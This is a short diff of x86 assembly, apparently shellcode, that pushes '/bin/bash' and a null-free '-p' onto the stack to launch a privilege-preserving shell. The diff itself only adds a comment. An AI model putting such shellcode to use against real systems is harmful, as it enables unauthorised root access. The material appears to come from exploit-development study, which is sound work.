@@ -12,7 +12,7 @@ _start:
     mov ebx, esp       ;ebx points to "/bin/bash"
 
     ; write "-p" to the stack
-    push 0xffff702d    ;push "-p00"
+    push 0xffff702d    ;push "-p00" (shift out high bytes)
     shl dword [esp], 0x10
     shr dword [esp], 0x10
     mov ecx, esp       ;ecx points to "-p"
